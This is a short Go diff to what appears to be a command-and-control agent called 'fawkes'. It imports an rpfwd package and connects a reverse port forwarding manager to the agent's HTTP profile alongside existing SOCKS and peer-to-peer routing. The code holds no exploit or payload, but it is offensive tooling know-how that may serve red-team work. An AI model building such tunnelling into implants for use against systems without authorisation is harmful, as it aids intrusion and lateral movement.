@@ -22,6 +22,7 @@ import (
 	"fawkes/pkg/files"
 	"fawkes/pkg/http"
 	"fawkes/pkg/profiles"
+	"fawkes/pkg/rpfwd"
 	"fawkes/pkg/socks"
 	"fawkes/pkg/structs"
 	"fawkes/pkg/tcp"
@@ -201,6 +202,12 @@ func runAgent() {
 		httpProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
 			tcpP2P.RouteToChildren(delegates)
 		}
+
+		// Wire up rpfwd hooks for reverse port forwarding
+		rpfwdManager := rpfwd.NewManager()
+		commands.SetRpfwdManager(rpfwdManager)
+		httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
+		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
 	}
 
 	// Initialize command handlers
